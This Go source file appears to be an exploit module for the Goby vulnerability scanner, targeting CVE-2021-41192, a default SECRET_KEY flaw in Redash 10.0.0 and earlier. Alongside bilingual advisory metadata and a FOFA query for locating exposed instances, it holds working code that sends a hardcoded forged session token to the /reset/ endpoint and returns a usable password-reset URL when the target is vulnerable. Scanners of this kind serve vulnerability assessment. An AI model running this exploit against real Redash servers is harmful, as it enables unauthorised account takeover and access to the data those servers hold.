package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Redash 10.0.0 version reset Api default SECRET_KEY (CVE-2021-41192)",
    "Description": "<p>Redash is a set of data integration and analysis solutions from the Israeli company Redash. The product supports data integration, data visualization, query editing, and data sharing.</p><p>Redash 10.0.0 and earlier versions have a default SECRET_KEY, and attackers can forge sessions to reset passwords and obtain sensitive information.</p>",
    "Impact": "<p>Redash 10.0.0 default SECRET_KEY (CVE-2021-41192)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/getredash/redash/security/advisories/GHSA-fcpv-hgq6-87h7\">https://github.com/getredash/redash/security/advisories/GHSA-fcpv-hgq6-87h7</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Redash",
    "VulType": [
        "Other"
    ],
    "Tags": [
        "Other"
    ],
    "Translation": {
        "CN": {
            "Name": "Redash 10.0.0 版本 reset 接口默认秘钥漏洞（CVE-2021-41192）",
            "Product": "Redash",
            "Description": "<p>Redash是以色列Redash公司的一套数据整合分析解决方案。该产品支持数据整合、数据可视化、查询编辑和数据共享等。</p><p>Redash 10.0.0及之前版本存在默认SECRET_KEY，攻击者可伪造session来重置密码，获取敏感信息等。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/getredash/redash/security/advisories/GHSA-fcpv-hgq6-87h7\">https://github.com/getredash/redash/security/advisories/GHSA-fcpv-hgq6-87h7</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Redash 10.0.0及之前版本存在默认SECRET_KEY，攻击者可伪造session来重置密码，获取敏感信息等。</p>",
            "VulType": [
                "其它"
            ],
            "Tags": [
                "其它"
            ]
        },
        "EN": {
            "Name": "Redash 10.0.0 version reset Api default SECRET_KEY (CVE-2021-41192)",
            "Product": "Redash",
            "Description": "<p>Redash is a set of data integration and analysis solutions from the Israeli company Redash. The product supports data integration, data visualization, query editing, and data sharing.</p><p>Redash 10.0.0 and earlier versions have a default SECRET_KEY, and attackers can forge sessions to reset passwords and obtain sensitive information.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/getredash/redash/security/advisories/GHSA-fcpv-hgq6-87h7\">https://github.com/getredash/redash/security/advisories/GHSA-fcpv-hgq6-87h7</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Redash 10.0.0 default SECRET_KEY (CVE-2021-41192)</p>",
            "VulType": [
                "Other"
            ],
            "Tags": [
                "Other"
            ]
        }
    },
    "FofaQuery": "body=\"redash_icon_small.png\" && body=\"Redash\"",
    "GobyQuery": "body=\"redash_icon_small.png\" && body=\"Redash\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/getredash/redash",
    "DisclosureDate": "2022-01-04",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202111-2078"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.5",
    "CVEIDs": [
        "CVE-2021-41192"
    ],
    "CNVD": [
        "CNVD-2021-95240"
    ],
    "CNNVD": [
        "CNNVD-202111-2078"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10251"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/reset/IjEi.YdEknw.htZVzELmilJCgsSYu1oMXXEVhWY"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Password Reset")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/reset/IjEi.YdEknw.htZVzELmilJCgsSYu1oMXXEVhWY"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Password Reset") {
					expResult.Output = "the password reset url:\n" + expResult.HostInfo.FixedHostInfo + "/reset/IjEi.YdEknw.htZVzELmilJCgsSYu1oMXXEVhWY"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
